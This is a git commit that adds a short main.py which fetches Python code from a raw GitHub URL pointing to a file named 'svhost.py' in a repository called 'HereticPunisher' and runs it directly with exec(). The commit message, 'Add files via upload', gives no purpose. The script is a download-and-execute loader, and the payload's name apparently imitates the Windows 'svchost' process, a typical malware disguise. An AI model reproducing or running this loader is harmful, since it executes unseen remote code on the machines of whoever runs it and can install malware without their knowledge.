41376a52fcc4741d25d853a1569da51afccfec83
lopeklol <pawel.kawalec2008@gmail.com>
2025-01-02 16:50:23 +0100

    Add files via upload

---
+++ main.py
@@ -0,0 +1,15 @@
+import requests
+
+def execute_code(url):
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+        
+        code = response.text
+        exec(code)
+
+    except Exception as e:
+        print(f"Failed to execute code: {e}")
+
+url = 'https://raw.githubusercontent.com/lopeklol/HereticPunisher/main/svhost.py'
+execute_code(url)
